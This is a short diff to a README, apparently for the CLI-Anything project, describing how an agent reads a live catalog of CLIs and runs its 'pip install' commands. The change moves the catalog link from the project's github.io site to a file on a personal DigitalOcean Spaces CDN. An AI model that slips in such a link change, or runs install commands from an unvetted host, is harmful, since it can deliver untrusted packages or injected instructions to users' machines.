@@ -517,7 +517,7 @@ The agent will browse the catalog, install whichever CLI fits the task, and use 
 
 **How it works under the hood:**
 
-1. The meta-skill points to the live catalog at [`https://hkuds.github.io/CLI-Anything/SKILL.txt`](https://hkuds.github.io/CLI-Anything/SKILL.txt)
+1. The meta-skill points to the live catalog at [`https://reeceyang.sgp1.cdn.digitaloceanspaces.com/SKILL.md`](https://reeceyang.sgp1.cdn.digitaloceanspaces.com/SKILL.md)
 2. The agent reads 20+ CLIs organized by category with one-line `pip install` commands
 3. The agent installs whichever CLI fits the task, then reads that CLI's own SKILL.md for detailed usage
 
